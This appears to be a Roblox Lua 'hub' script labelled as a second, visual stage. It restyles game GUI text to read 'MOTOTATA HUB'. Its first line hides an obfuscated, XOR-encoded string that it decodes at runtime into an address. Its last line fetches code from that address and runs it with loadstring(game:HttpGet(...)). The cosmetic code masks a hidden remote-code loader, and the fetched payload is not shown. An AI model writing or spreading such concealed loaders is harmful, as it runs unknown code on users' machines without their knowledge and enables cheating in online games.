
--[[ STAGE 2: VISUAL CORE ]]
local _ymu5gDkkeYRP="\176\167\179\120\100\118\114\122\121\206\206\213\162\219\220\208\212\225\184\183\225\224\234\232\250\205\204\253\252\231\216\002\015\023\019\017\238\237\020\044\047\035\033\053\045\009\008\015\023\017\056\060\080\066\086\090\075\079\058\031\099\095\106\105\046\112\115\121\114\121\132\125\123\142\076\150\134\150\154\153\164\159\166\168\170\174\112\177\182\189\125\182\195\203\191\204\206\213\201\221\206\211\229\217\225\224\230\247\179\237\250\240\190\193\177\251\253\004\007\014"local c4ErZwFat5Vf7T=25 local WrvOJ91ttXnZi8z5=52 local yAnBYep0SrWCcAbf0I=0 local SE4v2r5Z28dv1vXdPFZwY=3 local aEtm9wlWh6QoZIP9Gd=1 local S11rV3d5YDQkWiMxC=true local qNCCkCrxtxcN=bit32 and bit32.bxor if not qNCCkCrxtxcN then qNCCkCrxtxcN=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local fqg7FJukrJS51={}for MpzadMxgWslZ0O3nj=1,#_ymu5gDkkeYRP do local O3bF7fDOikLe6H_=string.byte(_ymu5gDkkeYRP,MpzadMxgWslZ0O3nj)local poVt6Yb1YehGX6nbe=(WrvOJ91ttXnZi8z5+(MpzadMxgWslZ0O3nj*SE4v2r5Z28dv1vXdPFZwY)+aEtm9wlWh6QoZIP9Gd)%256 if yAnBYep0SrWCcAbf0I==0 then O3bF7fDOikLe6H_=(O3bF7fDOikLe6H_-poVt6Yb1YehGX6nbe)%256 fqg7FJukrJS51[MpzadMxgWslZ0O3nj]=string.char(qNCCkCrxtxcN(O3bF7fDOikLe6H_,c4ErZwFat5Vf7T))else O3bF7fDOikLe6H_=qNCCkCrxtxcN(O3bF7fDOikLe6H_,c4ErZwFat5Vf7T)fqg7FJukrJS51[MpzadMxgWslZ0O3nj]=string.char((O3bF7fDOikLe6H_-poVt6Yb1YehGX6nbe)%256)end end local z3HdI1KMSOIYhqm_7uc=table.concat(fqg7FJukrJS51)if S11rV3d5YDQkWiMxC then z3HdI1KMSOIYhqm_7uc=string.reverse(z3HdI1KMSOIYhqm_7uc)end local KHfiufDuOz2Epn=z3HdI1KMSOIYhqm_7uc
local HubName = "MOTOTATA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(KHfiufDuOz2Epn))()
